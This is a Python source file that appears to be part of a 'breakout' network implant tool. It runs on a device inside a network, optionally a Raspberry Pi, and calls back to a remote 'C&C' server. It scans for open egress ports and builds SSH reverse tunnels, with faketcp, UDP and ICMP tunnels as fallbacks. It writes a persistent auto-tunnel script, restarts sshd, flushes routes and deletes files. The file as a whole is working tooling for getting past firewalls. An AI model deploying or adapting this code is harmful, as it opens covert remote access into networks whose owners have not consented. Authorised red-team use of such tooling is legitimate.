#!/usr/bin/env python
# By Robin Lennox - twitter.com/robberbear

import os
import re
import shutil
import subprocess
import time

import netifaces

from lib.Layout import colour
from lib.PortCheck import check_port, portquiz_scan, traceroute_port_check, openPorts, possiblePorts
from lib.ProtocolCheck import check_icmp
from lib.SetupTunnel import openPort, checkTunnel, udp2rawTunnel

# Import Colour Scheme
G, Y, B, R, W = colour()


def replaceText(filename, origText, replaceText, ):
    s = open(filename).read()
    s = s.replace(str(origText), str(replaceText))
    f = open(filename, 'w')
    f.write(s)
    f.close()


def successMessage(ipAddr, port, sshuser):
    print(W + "------------------------------" + W)
    if sshuser:
        print(W + "[!] Port forward using: ssh -f -N -D 8123 {0}@{1} -p{2} -i /home/{0}/.ssh/id_rsa".format(sshuser, ipAddr, port,) + W)
    else:
        print(W + "[!] Port forward example: ssh -f -N -D 8123 root@{0} -p{1}".format(ipAddr, port,) + W)
    print(W + "[!] Check it's working using: curl --proxy socks5h://localhost:8123 http://google.com" + W)
    print(W + "------------------------------" + W)


def getInterfaces():
    interface_list = netifaces.interfaces()
    # Get Wireless Interfaces
    return filter(lambda x: 'wl' in x, interface_list)


def check_ports(aggressive, config, verbose, ):
    global callbackPort
    callbackPort = []

    if config.getboolean('SCAN','PORTQUIZ') is True:
        print(B + "\n[-] Running test for commonly open ports." + W)

        if verbose:
            print(Y + "[*] Checking for open ports using portquiz.net" + W)
        
        check_port(aggressive, config, portquiz_scan, verbose, )
    else:
        if verbose:
            print(W + "[!] Config: Skipping portquiz.net scan" + W)

    # Portquiz might be blocked so try traceroute
    if not openPorts:
        if config.getboolean('SCAN','TRACEROUTE') is True:
            if verbose:
                print(R + "[*] portquiz.net returned no open ports" + W)
                print(B + "\n[-] Running test for commonly open ports." + W)
                print(Y + "[*] Checking for open ports using traceroute" + W)
            check_port(aggressive, config, traceroute_port_check, verbose, )
        else:
            if verbose:
                print(W + "[!] Config: Skipping traceroute scan" + W)

    if openPorts:
        callbackPort = openPorts
        print(G + "[+] {0} open port/s found".format(len(callbackPort)) + W)
    else:
        print(R + "[x] No open port found." + W)

    if possiblePorts:
        print(Y + "[*] {0} possible port/s found".format(len(possiblePorts)) + W)


def checkSSHStatus(callbackIP, callbackSSHPort):
    checkSSHFile = '/opt/breakout/lib/checkSSH.sh'
    try:
        subprocess.check_output(
            'netstat -tnpa | grep \'ESTABLISHED.*ssh\' | grep {0} | grep {1}'.format(callbackIP, callbackSSHPort), shell=True)
        if os.path.isfile(checkSSHFile):
            with open(checkSSHFile) as f:
                for line in f:
                    if str(re.findall(r"(?<=callbackIP=')(.*)(?=')", line))[2:-2]:
                        ip = str(re.findall(
                            r"(?<=callbackIP=')(.*)(?=')", line))[2:-2]

                    if str(re.findall(r"(?<=callbackPort=')(.*)(?=')", line))[2:-2]:
                        port = int(
                            str(re.findall(r"(?<=callbackPort=')(.*)(?=')", line))[2:-2])

            print(
                Y + "[*] Checking existing SSH port {0} is open on {1}".format(port, ip, ) + W)
            if not openPort(port, ip) or not checkTunnel(ip, port):
                return False
            else:
                return True
        else:
            return False
    except:
        print(R + "[x] Existing tunnel {0} is down".format(callbackIP) + W)
        return False


def callbackTCP(callbackIP, config, sshuser, tunnelPassword, nameserver, verbose, ):
    status = False
    tunnelType = None
    attemptPort = None
    if callbackPort:
        print(B + "\n[-] Attempting to create TCP tunnel." + W)
        if config.getboolean('TUNNEL','TCP') is True:
            for attemptPort in callbackPort:
                count = 0
                stopCount = 100
                if verbose:
                    print(
                        Y + "[*] Calling back to IP {0} on port {1}".format(callbackIP, attemptPort,) + W)
                while (count < stopCount and status is False):
                    if openPort(attemptPort, callbackIP):
                        count = stopCount
                        if checkTunnel(callbackIP, attemptPort):
                            print(G + "[+] SSH is Open" + W)
                            successMessage(callbackIP, attemptPort, sshuser)
                            status = True
                            tunnelType = 'Open Port'
                            return callbackIP, attemptPort, tunnelType, status
                        else:
                            print(R + "\n[x] Port {0} open on IP {1} but unable to connect via SSH".format(
                                attemptPort, callbackIP,) + W)
                    else:
                        if verbose:
                            print(
                                B + "[-] Waiting for port {0} to be open on IP {1}".format(attemptPort, callbackIP,) + W)
                        count = count + 1

                        if count == stopCount:
                            print(R + "\n[x] Port {0} not open on IP {1} after {2} attempts".format(
                                attemptPort, callbackIP, stopCount) + W)
        else:
            if verbose:
                print(W + "[!] Config: Skipping TCP tunnel" + W)
    else:
        print(
            R + "[x] Can't attempt TCP Tunnel, no ports found open on IP {0}".format(callbackIP,) + W)

    return callbackIP, attemptPort, tunnelType, status

def callbackNonTCP(callbackIP, config, sshuser, tunnelPassword, nameserver, verbose, ):
    print(B + "\n[-] Attempting to create Non TCP tunnel." + W)
    tunnelIP = '127.0.0.1'
    localPort = 3322
    tunnelType = None
    status = False
    if config.getboolean('TUNNEL','FAKETCP') is True:
        # Non TCP Tunnels
        tunnelType = 'faketcp'
        tunnelPort = 4001
        listenPort = 8856
        status = setupNonTCPTunnel(status, callbackIP, nameserver, tunnelIP,
                                tunnelType, tunnelPort, localPort, listenPort, sshuser, tunnelPassword, verbose,)
    else:
        if verbose:
            print(W + "[!] Config: Skipping fakeTCP tunnel" + W)

    if status is False:
        if config.getboolean('TUNNEL','UDP') is True:
            tunnelType = 'udp'
            tunnelPort = 4003
            listenPort = 8857
            status = setupNonTCPTunnel(status, callbackIP, nameserver, tunnelIP,
                                    tunnelType, tunnelPort, localPort, listenPort, sshuser, tunnelPassword, verbose, )
        else:
            if verbose:
                print(W + "[!] Config: Skipping UDP tunnel" + W)

    if status is False:
        if config.getboolean('TUNNEL','ICMP') is True:
            if check_icmp():
                if verbose:
                    print(G + "[+] ICMP is enabled" + W)
                tunnelType = 'icmp'
                tunnelPort = 4000
                listenPort = 8855
                status = setupNonTCPTunnel(status, callbackIP, nameserver, tunnelIP, tunnelType, tunnelPort, localPort,
                                        listenPort, sshuser, tunnelPassword, verbose, )
            else:
                print(
                    R + "[x] Can't attempt {0} Tunnel, {0} is disabled\n".format(tunnelType) + W)
                status = False
        else:
            if verbose:
                print(W + "[!] Config: Skipping ICMP tunnel" + W)

    return tunnelIP, localPort, tunnelType, status


def setupNonTCPTunnel(status, callbackIP, nameserver, tunnelIP, tunnelType, tunnelPort, localPort, listenPort, sshuser, tunnelPassword, verbose, ):
    if not status:
        print(
            Y + "[*] Trying a Udp2raw-tunnel using {0}.".format(tunnelType) + W)
        if udp2rawTunnel(callbackIP, tunnelIP, tunnelType, tunnelPort, localPort, listenPort, tunnelPassword, verbose, ):
            if checkTunnel(tunnelIP, tunnelPort):
                print(
                    G + "[+] A Udp2raw-tunnel {0} tunnel can be setup!".format(tunnelType) + W)
                print(
                    B + "[-] An {0} Tunnel is not as fast as a TCP Tunnel".format(tunnelType) + W)
                successMessage(tunnelIP, tunnelPort, sshuser)
                status = True
            else:
                print(
                    R + "[x] {0} Enabled but unable to create {0} Tunnel".format(tunnelType) + W)
                status = False
        else:
            print(
                R + "[x] {0} Enabled but unable to create {0} Tunnel".format(tunnelType) + W)
            status = False

    return status


def writeFile(fileName, timeStamp, ethernetUp, usedGatewayWifi, successfulConnection):
    if successfulConnection:
        subprocess.check_output('rm /opt/breakout/logs/tunnels.txt > /dev/null 2>&1', shell=True,
                                stderr=subprocess.STDOUT)
    with open(fileName, 'a') as file:
        file.write("{0} Ethernet_Up={1} Tried_WiFi_Gateway={2} Successful_Connection={3} \n".format(
            timeStamp, ethernetUp, usedGatewayWifi, successfulConnection,))


def defaultRoute(interface):
    try:
        # Will attempt to stay connected to Wifi
        gateway = subprocess.check_output(
            'cat /var/lib/dhcp/dhclient.leases | awk \'/{0}/,/routers/\' | grep -o -P \'(?<=routers ).*(?=;)\' | uniq'.format(interface,), shell=True, stderr=subprocess.STDOUT)
        # Cleanup String
        gateway = gateway.rsplit()[0]
        # Delete old route
        subprocess.check_output(
            "route del -net 0.0.0.0 netmask 0.0.0.0 gw {0} dev {1} > /dev/null 2>&1".format(
                gateway, interface, ),
            shell=True, stderr=subprocess.STDOUT)

        print(W + "[!] Set default route to connect to the internet on interface {0} via gateway {1}".format(
            interface, gateway, ) + W)
        subprocess.check_output(
            "ip route add default via {0} dev {1} > /dev/null 2>&1".format(gateway, interface, ), shell=True,
            stderr=subprocess.STDOUT)
        return True
    except:
        print(
            R + "[x] No DHCP information found for interface {0}." + W).format(interface,)


def is_interface_up(interface, verbose):
    if "down" in subprocess.check_output('cat /sys/class/net/{0}/operstate'.format(interface), shell='True').decode('utf-8'):
        return False
    else:
        return True


def setupGateways(ethernetInterface, ethernetUp, gatewayWifi, successfulConnection, timeout, ):
    # Create file if not exist
    open("/opt/breakout/logs/tunnels.txt", "a")
    # gatewayWifi = defaultRoute(ethernetInterface)
    totalAttempts = subprocess.check_output('awk -v d1="$(date -d@"$(( $(date +%s)-{0}))" "+%b %_d %H:%M")" -v d2="$(date "+%b %_d %H:%M")" \'$0 > d1 && $0 < d2 || $0 ~ d2\' /opt/breakout/logs/tunnels.txt | grep Successful_Connection=False | wc -l'.format(timeout),shell=True, stderr=subprocess.STDOUT).decode('utf-8').rstrip().lstrip()
    if ethernetUp and int(totalAttempts) > 20:
        print(R + "[!] Unable to tunnel resetting routing tables and rebooting" + W)

        # Clear routing table and applying default settings.
        subprocess.check_output("rm /opt/breakout/logs/tunnels.txt > /dev/null 2>&1'", shell=True,
                                stderr=subprocess.STDOUT)
        subprocess.check_output("rm /opt/breakout/lib/checkSSH.sh > /dev/null 2>&1", shell=True,
                                stderr=subprocess.STDOUT)
        subprocess.check_output(
            "rm /etc/motd > /dev/null 2>&1", shell=True, stderr=subprocess.STDOUT)
        subprocess.check_output("ip route flush table main && udhcpc -i {0}".format(
            ethernetInterface), shell=True, stderr=subprocess.STDOUT)

    elif ethernetUp and totalAttempts and int(totalAttempts) > 5:
        gatewayWifi = True
        print(R + "[!] Unable to tunnel out using current default routes" + W)
        interfaces = getInterfaces()
        for wirelessInterface in interfaces:
            print(
                B + "[-] Trying to route internet traffic via interface {0}".format(wirelessInterface,) + W)
            # Reset the default interface
            subprocess.check_output("ifconfig {0} down".format(
                ethernetInterface), shell=True, stderr=subprocess.STDOUT)
            time.sleep(10)

    writeFile('/opt/breakout/logs/tunnels.txt', time.strftime("%b %-d %H:%M:%S"), ethernetUp, gatewayWifi,
              successfulConnection)


def setupAutoTunnel(checkSSHLOC, gatewayWifi, sshuser, tunnelIP, tunnelPort, tunnelType, ):
    shutil.copy('/opt/breakout/lib/checkSSH.bak', checkSSHLOC)
    replaceText(checkSSHLOC, 'SET_IP', tunnelIP)
    replaceText(checkSSHLOC, 'SET_PORT', tunnelPort)
    replaceText(checkSSHLOC, 'SET_USER', sshuser)
    replaceText(checkSSHLOC, 'TUNNEL_TYPE', tunnelType)
    replaceText(checkSSHLOC, 'GATEWAY_WIFI', gatewayWifi)
    print(G + "[+] Setup remote tunnel configuration file" + W)


def checkInterfaces(currentSSID, verbose):
    ethernetUp = True
    wirelessUp = False

    interface_list = netifaces.interfaces()
    # Get Ethernet Interfaces
    for interface in interface_list:
        if interface.startswith('e'):
            ethernetUp = is_interface_up(interface, verbose)
            ethernetInterface = interface

        if "NOT CONNECTED" not in currentSSID and interface.startswith('w'):
            wirelessUp = is_interface_up(interface, verbose)

    return ethernetUp, ethernetInterface, wirelessUp


def currentSSHTunnel(checkSSHLOC, config, isPi, ethernetUp, gatewayWifi, successfulConnection,verbose ):
    tunnelOpen = True
    checkForTunnel = config.getboolean('TUNNEL','CHECKEXISTING')

    if checkForTunnel is False:
        tunnelOpen = False
        if verbose:
            print(W + "[!] Config: Skipping checking existing tunnel" + W)
    elif os.path.isfile(checkSSHLOC):
        # Extract callback IP
        with open(checkSSHLOC, 'r') as file:
            for line in file:
                if "callbackIP=" in line:
                    callbackSSHIP = line.split('=')[1]
                    callbackSSHIP = line[12:-2]
                if "callbackPort=" in line:
                    callbackSSHPort = line.split('=')[1]

            if checkSSHStatus(callbackSSHIP, callbackSSHPort):
                print(
                    G + "[+] Tunnel already open and working on {0}".format(callbackSSHIP) + W)

                if isPi:
                    # Make the power LED Flash to show the connection is active to C&C
                    subprocess.check_output("sh -c 'echo timer >/sys/class/leds/led1/trigger'", shell=True,
                                            stderr=subprocess.STDOUT)

                successfulConnection = True
                writeFile('/opt/breakout/logs/tunnels.txt', time.strftime("%b %-d %H:%M:%S"), ethernetUp, gatewayWifi,
                          successfulConnection)
            else:
                tunnelOpen = False
    else:
        tunnelOpen = False

    return tunnelOpen

def checkSSH(checkSSHLOC):
    process = subprocess.Popen("rc-status --crashed".split(),
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if "sshd" in str(process.communicate()):
        print(R + "[!] SSH crashed!" + W)
        subprocess.Popen("rc-service sshd stop && rc-service sshd start".split(), stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)
        subprocess.Popen("bash {0}".format(checkSSHLOC).split(
        ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(Y + "[*] Setting up SSH" + W)
        time.sleep(10)

def quickScan(callbackPort,callbackIP,config, sshuser, verbose):
    status = False
    quickScanStatus = config.getboolean('SCAN','QUICK')
    if quickScanStatus is True:
        if openPort(callbackPort, callbackIP) and checkTunnel(callbackIP, callbackPort):
            if verbose:
                print(
                    Y + "[*] Quick check if port {0} is accessible.".format(callbackPort) + W)
            print(G + "[+] SSH tunnel possible!" + W)
            successMessage(callbackIP, callbackPort, sshuser)
            status = True
        else:
            if verbose:
                print(
                    R + "[!] Quick check failed, Port {0} not accessible.".format(callbackPort) + W)
    else:
        if verbose:
            print(W + "[!] Config: Skipping Quick Scan" + W)
    
    return status

def initialiseTunnel(aggressive, callbackIP, config, currentSSID, tunnelPassword, isPi, nameserver, sshuser, tunnel, verbose,):
    checkSSHLOC = '/opt/breakout/lib/checkSSH.sh'
    successfulConnection = False
    #30 Mins
    timeout = '1800'

    ethernetUp, ethernetInterface, wirelessUp = checkInterfaces(
        currentSSID, verbose)
    checkSSH(checkSSHLOC)

    if ethernetUp == False and wirelessUp == False:
        print(R + "[!] No Interface is up." + W)
        if isPi:
            # Reset Heartbeat
            subprocess.check_output(
                "sh -c 'echo input >/sys/class/leds/led1/trigger'", shell=True, stderr=subprocess.STDOUT)
        quit()

    # Check if Gateway is set
    try:
        if os.path.isfile('/opt/breakout/logs/tunnels.txt'):
            gatewayWifi = subprocess.check_output(
                'tail -n 1 /opt/breakout/logs/tunnels.txt | awk \'{print $5}\' | cut -f2 -d\'=\'', shell=True, stderr=subprocess.STDOUT).rstrip().decode('utf-8')

        else:
            gatewayWifi = False
    except:
        gatewayWifi = False

    if currentSSHTunnel(checkSSHLOC, config, isPi, ethernetUp, gatewayWifi, successfulConnection, verbose) is False:
        # Check which Gateway to use Ethernet or WiFi
        setupGateways(ethernetInterface, ethernetUp, gatewayWifi,
                      successfulConnection, timeout, )

        if isPi:
            # Reset Heartbeat
            subprocess.check_output(
                "sh -c 'echo input >/sys/class/leds/led1/trigger'", shell=True, stderr=subprocess.STDOUT)

        # Kill all open SSH
        command = "killall ssh > /dev/null 2>&1"
        subprocess.Popen(command.split(), stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
        callbackPort = config.get('SCAN','CALLBACKPORT')
        
        tunnelIP = callbackIP
        tunnelPort = callbackPort
        tunnelType = 'Open Port'

        tunnelStatus = quickScan(callbackPort,callbackIP,config,sshuser,verbose) 
        if tunnelStatus is False:
            check_ports(aggressive, config, verbose, )

            if all(v is None for v in [callbackIP, nameserver]):
                print(
                    Y + "[*] Unable to create tunnel as no nameserver or callback IP was provided." + W)
            else:
                tunnelIP, tunnelPort, tunnelType, tunnelStatus = callbackTCP(callbackIP, config, sshuser, tunnelPassword, nameserver, verbose, )
                if tunnelStatus is False:
                    tunnelIP, tunnelPort, tunnelType, tunnelStatus = callbackNonTCP(
                            callbackIP, config, sshuser, tunnelPassword, nameserver, verbose, )

        if tunnelStatus is False:
            print(R + '[!] Tunnel not possible, as no possible tunnels to the callback server could be found' + W)
            pass
        elif tunnel is True:
            setupAutoTunnel(checkSSHLOC, gatewayWifi, sshuser,
                            tunnelIP, tunnelPort, tunnelType, )
            attemptSSHTunnel = subprocess.check_output(
                'bash {0}'.format(checkSSHLOC), shell=True).decode('utf-8')
            # Allow time for tunnel to start over low latancy.
            waitTime = config.getint('TUNNEL','WAITTIME')
            print(
                Y + "[*] Waiting {0} seconds for tunnel to start".format(waitTime) + W)
            time.sleep(waitTime)
            print(G + "{0}".format(attemptSSHTunnel) + W)